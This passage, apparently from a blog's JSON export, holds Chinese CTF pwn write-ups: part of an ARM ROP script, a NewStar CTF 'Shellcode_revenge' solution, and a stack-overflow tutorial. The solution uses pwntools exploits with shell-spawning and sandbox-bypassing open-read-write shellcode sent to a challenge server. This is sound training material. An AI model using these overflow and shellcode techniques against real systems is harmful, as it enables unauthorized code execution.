class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">bincat_addr=<span class=\"number\">0x0002103C</span></span><br><span class=\"line\">sys_addr=<span class=\"number\">0x000105E0</span></span><br><span class=\"line\">pop_r3_pc=<span class=\"number\">0x000103a4</span></span><br><span class=\"line\">mov_r0_r3_pop_fp_pc=<span class=\"number\">0x00010558</span></span><br><span class=\"line\"></span><br><span class=\"line\">r()</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x24</span>+p32(pop_r3_pc)+p32(bincat_addr)+p32(mov_r0_r3_pop_fp_pc)+p32(sys_addr)*<span class=\"number\">2</span></span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"Shellcode_revenge","date":"2023-01-02T11:54:26.000Z","_content":"\nNewStar CTF week2的一道题，64bit没开canary，有个沙箱\n\n<!-- more -->\n\n![ida](./shellcode_revenge/ida.jpg)\n\n没加沙箱可以把shellcode写到buf，然后栈溢出修改返回地址为buf然后getshell。\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nelf=ELF(\"./pwn\")\np=process(\"./pwn\")\n#p=remote('node4.buuoj.cn',27624)\npadding=0x38\nshellcode=asm(shellcraft.sh())\np.recv()\np.sendline(shellcode)\np.recv()\npayload='a'*padding+p64(0x233000)\np.sendline(payload)\np.interactive()\n```\n\n加了的话不能执行execve()和13号系统调用(sys_rt_sigaction)，不过可以用open(),read(),write()直接打印出flag，看来是要自己写shellcode了。\n\n后来发现第一次read只读入了0x1A，因此只能先写一个sys_read，在下次ret到0x233000执行输入一个长一点的内容。执行read函数调用后在后面继续写入orw，read函数执行完后就会执行后面的orw，执行open函数打开./flag，执行read函数读出flag到0x233100，最后用write函数输出出来。\n\n其实也可以不用orw，用shellcraft.cat(\"./flag\\x00\")也可以cat flag（只要输入长度够）。\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nelf=ELF(\"./pwn\")\n#p=process(\"./pwn\")\np=remote('node4.buuoj.cn',26004)\n\ndef debug():\n\tgdb.attach(p,\"b main\")\n\tpause()\n\npadding=0x38\nshellcode=asm(\n'''\n    xor rax, rax\n    xor rdi, rdi\n    xor rsi, rsi\n    xor rdx, rdx\n    mov rax, 0x2\n    mov rdi, 0x0067616c662f2e   \n    push rdi\n    mov rdi, rsp\n    syscall  \n\n    mov rdx, 0x50   \n    mov rsi, 0x233100\n    mov rdi, rax    \n    mov rax, 0      \n    syscall\n    \n    mov rdi, 0x1     \n    mov rax, 0x1      \n    syscall\n'''\n)\n\nshellcode_read=asm(\n'''\n    xor eax,eax\n    xor rdi, rdi \n    mov rdx, 0x100\n    mov rsi, 0x233015\n    syscall\n'''\n    )\n\n#print(hex(len(shellcode_read)))\n#pause()\np.recvuntil('Well.Just a little.\\n')\n\np.sendline(shellcode_read)\np.recvuntil(\"Let's see what u can do this time~\\n\")\n\npayload='a'*padding+p64(0x233000)\np.sendline(payload)\n#debug()\np.recvuntil(\"See you!\\n\")\npayload=shellcode\np.send(payload)\np.interactive()\n```\n","source":"_posts/shellcode_revenge.md","raw":"---\ntitle: Shellcode_revenge\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- stackoverflow\n- sandbox\n- orw\n\n---\n\nNewStar CTF week2的一道题，64bit没开canary，有个沙箱\n\n<!-- more -->\n\n![ida](./shellcode_revenge/ida.jpg)\n\n没加沙箱可以把shellcode写到buf，然后栈溢出修改返回地址为buf然后getshell。\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nelf=ELF(\"./pwn\")\np=process(\"./pwn\")\n#p=remote('node4.buuoj.cn',27624)\npadding=0x38\nshellcode=asm(shellcraft.sh())\np.recv()\np.sendline(shellcode)\np.recv()\npayload='a'*padding+p64(0x233000)\np.sendline(payload)\np.interactive()\n```\n\n加了的话不能执行execve()和13号系统调用(sys_rt_sigaction)，不过可以用open(),read(),write()直接打印出flag，看来是要自己写shellcode了。\n\n后来发现第一次read只读入了0x1A，因此只能先写一个sys_read，在下次ret到0x233000执行输入一个长一点的内容。执行read函数调用后在后面继续写入orw，read函数执行完后就会执行后面的orw，执行open函数打开./flag，执行read函数读出flag到0x233100，最后用write函数输出出来。\n\n其实也可以不用orw，用shellcraft.cat(\"./flag\\x00\")也可以cat flag（只要输入长度够）。\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nelf=ELF(\"./pwn\")\n#p=process(\"./pwn\")\np=remote('node4.buuoj.cn',26004)\n\ndef debug():\n\tgdb.attach(p,\"b main\")\n\tpause()\n\npadding=0x38\nshellcode=asm(\n'''\n    xor rax, rax\n    xor rdi, rdi\n    xor rsi, rsi\n    xor rdx, rdx\n    mov rax, 0x2\n    mov rdi, 0x0067616c662f2e   \n    push rdi\n    mov rdi, rsp\n    syscall  \n\n    mov rdx, 0x50   \n    mov rsi, 0x233100\n    mov rdi, rax    \n    mov rax, 0      \n    syscall\n    \n    mov rdi, 0x1     \n    mov rax, 0x1      \n    syscall\n'''\n)\n\nshellcode_read=asm(\n'''\n    xor eax,eax\n    xor rdi, rdi \n    mov rdx, 0x100\n    mov rsi, 0x233015\n    syscall\n'''\n    )\n\n#print(hex(len(shellcode_read)))\n#pause()\np.recvuntil('Well.Just a little.\\n')\n\np.sendline(shellcode_read)\np.recvuntil(\"Let's see what u can do this time~\\n\")\n\npayload='a'*padding+p64(0x233000)\np.sendline(payload)\n#debug()\np.recvuntil(\"See you!\\n\")\npayload=shellcode\np.send(payload)\np.interactive()\n```\n","slug":"shellcode_revenge","published":1,"updated":"2023-01-02T15:56:22.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czagl00665oudcufm4ire","content":"<p>NewStar CTF week2的一道题，64bit没开canary，有个沙箱</p>\n<span id=\"more\"></span>\n\n<p><img src=\"./shellcode_revenge/ida.jpg\" alt=\"ida\"></p>\n<p>没加沙箱可以把shellcode写到buf，然后栈溢出修改返回地址为buf然后getshell。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;node4.buuoj.cn&#x27;,27624)</span></span><br><span class=\"line\">padding=<span class=\"number\">0x38</span></span><br><span class=\"line\">shellcode=asm(shellcraft.sh())</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">p.sendline(shellcode)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*padding+p64(<span class=\"number\">0x233000</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>加了的话不能执行execve()和13号系统调用(sys_rt_sigaction)，不过可以用open(),read(),write()直接打印出flag，看来是要自己写shellcode了。</p>\n<p>后来发现第一次read只读入了0x1A，因此只能先写一个sys_read，在下次ret到0x233000执行输入一个长一点的内容。执行read函数调用后在后面继续写入orw，read函数执行完后就会执行后面的orw，执行open函数打开./flag，执行read函数读出flag到0x233100，最后用write函数输出出来。</p>\n<p>其实也可以不用orw，用shellcraft.cat(“./flag\\x00”)也可以cat flag（只要输入长度够）。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(&quot;./pwn&quot;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">26004</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">\tgdb.attach(p,<span class=\"string\">&quot;b main&quot;</span>)</span><br><span class=\"line\">\tpause()</span><br><span class=\"line\"></span><br><span class=\"line\">padding=<span class=\"number\">0x38</span></span><br><span class=\"line\">shellcode=asm(</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    xor rax, rax</span></span><br><span class=\"line\"><span class=\"string\">    xor rdi, rdi</span></span><br><span class=\"line\"><span class=\"string\">    xor rsi, rsi</span></span><br><span class=\"line\"><span class=\"string\">    xor rdx, rdx</span></span><br><span class=\"line\"><span class=\"string\">    mov rax, 0x2</span></span><br><span class=\"line\"><span class=\"string\">    mov rdi, 0x0067616c662f2e   </span></span><br><span class=\"line\"><span class=\"string\">    push rdi</span></span><br><span class=\"line\"><span class=\"string\">    mov rdi, rsp</span></span><br><span class=\"line\"><span class=\"string\">    syscall  </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    mov rdx, 0x50   </span></span><br><span class=\"line\"><span class=\"string\">    mov rsi, 0x233100</span></span><br><span class=\"line\"><span class=\"string\">    mov rdi, rax    </span></span><br><span class=\"line\"><span class=\"string\">    mov rax, 0      </span></span><br><span class=\"line\"><span class=\"string\">    syscall</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    mov rdi, 0x1     </span></span><br><span class=\"line\"><span class=\"string\">    mov rax, 0x1      </span></span><br><span class=\"line\"><span class=\"string\">    syscall</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode_read=asm(</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    xor eax,eax</span></span><br><span class=\"line\"><span class=\"string\">    xor rdi, rdi </span></span><br><span class=\"line\"><span class=\"string\">    mov rdx, 0x100</span></span><br><span class=\"line\"><span class=\"string\">    mov rsi, 0x233015</span></span><br><span class=\"line\"><span class=\"string\">    syscall</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">    )</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#print(hex(len(shellcode_read)))</span></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Well.Just a little.\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(shellcode_read)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Let&#x27;s see what u can do this time~\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*padding+p64(<span class=\"number\">0x233000</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;See you!\\n&quot;</span>)</span><br><span class=\"line\">payload=shellcode</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<p>NewStar CTF week2的一道题，64bit没开canary，有个沙箱</p>","more":"<p><img src=\"./shellcode_revenge/ida.jpg\" alt=\"ida\"></p>\n<p>没加沙箱可以把shellcode写到buf，然后栈溢出修改返回地址为buf然后getshell。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;node4.buuoj.cn&#x27;,27624)</span></span><br><span class=\"line\">padding=<span class=\"number\">0x38</span></span><br><span class=\"line\">shellcode=asm(shellcraft.sh())</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">p.sendline(shellcode)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*padding+p64(<span class=\"number\">0x233000</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>加了的话不能执行execve()和13号系统调用(sys_rt_sigaction)，不过可以用open(),read(),write()直接打印出flag，看来是要自己写shellcode了。</p>\n<p>后来发现第一次read只读入了0x1A，因此只能先写一个sys_read，在下次ret到0x233000执行输入一个长一点的内容。执行read函数调用后在后面继续写入orw，read函数执行完后就会执行后面的orw，执行open函数打开./flag，执行read函数读出flag到0x233100，最后用write函数输出出来。</p>\n<p>其实也可以不用orw，用shellcraft.cat(“./flag\\x00”)也可以cat flag（只要输入长度够）。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(&quot;./pwn&quot;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">26004</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">\tgdb.attach(p,<span class=\"string\">&quot;b main&quot;</span>)</span><br><span class=\"line\">\tpause()</span><br><span class=\"line\"></span><br><span class=\"line\">padding=<span class=\"number\">0x38</span></span><br><span class=\"line\">shellcode=asm(</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    xor rax, rax</span></span><br><span class=\"line\"><span class=\"string\">    xor rdi, rdi</span></span><br><span class=\"line\"><span class=\"string\">    xor rsi, rsi</span></span><br><span class=\"line\"><span class=\"string\">    xor rdx, rdx</span></span><br><span class=\"line\"><span class=\"string\">    mov rax, 0x2</span></span><br><span class=\"line\"><span class=\"string\">    mov rdi, 0x0067616c662f2e   </span></span><br><span class=\"line\"><span class=\"string\">    push rdi</span></span><br><span class=\"line\"><span class=\"string\">    mov rdi, rsp</span></span><br><span class=\"line\"><span class=\"string\">    syscall  </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    mov rdx, 0x50   </span></span><br><span class=\"line\"><span class=\"string\">    mov rsi, 0x233100</span></span><br><span class=\"line\"><span class=\"string\">    mov rdi, rax    </span></span><br><span class=\"line\"><span class=\"string\">    mov rax, 0      </span></span><br><span class=\"line\"><span class=\"string\">    syscall</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    mov rdi, 0x1     </span></span><br><span class=\"line\"><span class=\"string\">    mov rax, 0x1      </span></span><br><span class=\"line\"><span class=\"string\">    syscall</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode_read=asm(</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    xor eax,eax</span></span><br><span class=\"line\"><span class=\"string\">    xor rdi, rdi </span></span><br><span class=\"line\"><span class=\"string\">    mov rdx, 0x100</span></span><br><span class=\"line\"><span class=\"string\">    mov rsi, 0x233015</span></span><br><span class=\"line\"><span class=\"string\">    syscall</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">    )</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#print(hex(len(shellcode_read)))</span></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Well.Just a little.\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(shellcode_read)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Let&#x27;s see what u can do this time~\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*padding+p64(<span class=\"number\">0x233000</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;See you!\\n&quot;</span>)</span><br><span class=\"line\">payload=shellcode</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"栈溢出","date":"2023-01-01T16:00:10.000Z","_content":"栈溢出是pwn的开始，是pwn中最基础的部分。不同系统的栈溢出利用会有所不同，但主要的思路都是一样的，下面主要记录的是linux下的栈溢出。\n<!--more-->\n\n## 函数调用栈\n\n函数调用的过程是通过**栈**实现的，这个栈就是函数调用栈。\n\n栈是一种先进后出（LIFO）的数据结构，有压栈(push)和出栈(pop)两种操作，函数调用栈中存放有函数调用信息和局部变量。\n其中函数调用信息包括**函数的返回地址**、**ebp(或rbp)的保存值**、**函数的参数**。\n\n不同位数对函数调用栈的利用有所不同：\n\n- intel_x86(32位)：函数的参数全部保存在栈中\n\n- intel_x64(64位)：函数的前六个整型或指针参数依次保存在寄存器rdi,rsi,rdx,rcx,r8,r9中，如果寄存器不够用才会保存在栈上\n\n函数的参数会在函数调用前（执行call指令之前）**逆序**入栈\n\n![stack](./stack_overflow/stack.png)\n\n函数调用栈从**高地址向低地址生长**，也就是说高地址处为栈底。\n\n在函数调用时，程序会执行call指令调用函数\n\n```\ncall function_name  //调用函数\n等价于下面两条指令\npush ret_addr   //将函数返回地址（即函数执行完后执行的下一条指令的地址）push入栈\njump function_name  //跳转到调用函数的具体代码\n```\n\n在跳转到调用函数的具体代码后，会首先执行以下指令：\n\n```\n如果是64位则是rsp和rbp\npush ebp    //将当前的ebp保存在栈上\nmov esp , ebp   //将ebp的值赋值给esp,让他们指向同一处\nsub esp , xh    //让esp的值减去x，为该函数的局部变量预留栈空间（此处的h表示x为16进制数）\n```\n\n在函数结束时，程序会执行leave和ret指令退出函数\n\n```\n如果是64位则是rsp、rbp和rip\nleave\n相当于下面两条指令\nmov esp , ebp  //将ebp的值赋值给esp,让他们指向同一处\npop ebp    //将之前保存的ebp pop出栈\n\nret\n相当于pop eip   //将之前保存的返回地址ret_addr pop到eip,eip寄存器中存放的是下一条要执行的指令的地址\n```\n\n## 栈溢出原理\n\n在程序执行的过程中，**栈中变量**写入的字节数**超出**了这个变量申请的字节数，导致**写入内容覆盖了栈中后续的变量**。栈溢出漏洞轻则使程序崩溃，重则使程序的执行流被控制。\n\n栈溢出漏洞是比较好发现的，只需要寻找**向栈上写入数据的函数**，并检查其**写入数据的字节数**是否合法即可。\n\n如下列的程序片段：\n\n```c\nvoid vuln()\n{\n    char buf[0x10];\n    read(0,buf,0x80);\n    //gets(buf);\n    //scanf(\"%s\",buf);\n    return;\n}\n\nint main()\n{\n    vuln();\n    return 0;\n}\n```\n\n在上面的vuln()函数中，**局部变量buf存储在栈上**，其申请的内存只有0x10字节，但在read()函数中却向buf中写入0x20字节，**超出了buf申请的范围**，除此之外，gets()函数和scanf()函数向buf中写入，但却没有检查写入的字节数目，因此也有栈溢出漏洞。\n\n栈溢出漏洞通常利用超出范围的写入**修改栈上的其他变量**，可以通过**修改栈上的变量改变程序的执行流程**，也可以通过**修改变量后保存在栈上的ebp和返回地址值改变程序的执行流程**。\n\n上述程序片段的栈空间如下：\n![stack](./stack_overflow/stack2.png)\n\n通过栈溢出可以覆盖vuln()函数的ebp和返回地址。\n\n## ret2txt\n\nret2txt是对程序原有代码片段的利用，通过栈溢出**将该函数的返回地址覆盖为程序原有的代码片段的地址**（如后门函数的地址），从而get shell。\n\n## ret2shellcode\n\n大部分程序都没有后门函数，因此ret2txt在许多场合下都是行不通的。因此需要我们自行写入一段能get shell的代码，这段代码就是shellcode。通过栈溢出**将该函数的返回地址覆盖为shellcode**即可get shell。\n\npwntools中可以很方便的得到shellcode。\n\n```python\nfrom pwn import*\ncontext.arch='...'  #设置系统的架构，如amd64，i386...\n\nshellcode = asm(shellcraft.sh())\n```\n\n然而ret2shellcode会受到**NX保护**的防护，在开启NX保护后，写入的shellcode所在的内存页不可执行，因此无法运行shellcode得到shell。\n\n## ret2syscall\n\nret2syscall通过系统调用execve()执行execve(\"/bin/sh\",NULL,NULL)进行get shell。\n\n执行系统调用execve(\"/bin/sh\",NULL,NULL)仅需要将需要的参数传到**寄存器**，之后控制程序执行**int 0x80(32位)**或**syscall(64位)**。\n\n对于**32位**而言，需要将**系统调用号**传到**eax**寄存器，execve()的系统调用号为**11**；**第一个参数\"/bin/sh\"的地址**传到**ebx**寄存器；**第二、第三个**参数0传到**ecx,edx**寄存器。\n\n对于**64位**而言，需要将**系统调用号**传到**rax**寄存器，execve()的系统调用号为**59**；**第一个参数\"/bin/sh\"的地址**传到**rdi**寄存器；**第二、第三个**参数0传到**rsi,rdx**寄存器。\n\n如果有其他需要，也可以通过改变传入的系统调用号和参数执行其他的系统调用（如read、write、sigreturn）。\n\n要达到传参和调用syscall的目的，我们可以利用进一步**利用程序中更小的代码片段**（以后称为**gadget**）。\n\n通过ROPgadget可以找到程序中可以利用的gadget，\n```\nROPgadget --binary 二进制文件名 --only 关键词(如pop、ret、eax、ebx...，关键词中可用|表示或) 可用于查找对应的gadget的地址\nROPgadget --binary 二进制文件名 --string 字符串 可用于查找对应字符串的地址\n\n后面可以接grep命令通过表达式缩小查找范围，除此之外ROPgadget还有其他用处。\n```\n\n通常找到的gadget大概是这样的：（如果能找到的话）\n```\n0x080480c9:pop rbx; ret\n0x0804808a:pop rbx; pop rdi; pop rsi; ret\n...\n\n0x08049421:int 0x80;\n...\n\n0x080be408:\"/bin/sh\"\n```\n\n通过在栈上布置pop指令，并在栈的后面布置要pop的参数，将该参数pop到对应寄存器中，由于通常选择**后续紧跟ret**的gadget，因此在执行了一个gadget后会ret，方便我们继续劫持栈。\n\n对于寄存器**eax(rax)**，还有其他的方式可以控制其值。一般来说，函数的**返回值**都会存放在寄存器eax(rax)中，据此可以通过函数返回值控制其值。如**read()函数会返回其读入数据的长度**，因此可以通过read()函数读入数据的长度来控制eax(rax)的值。\n\n## 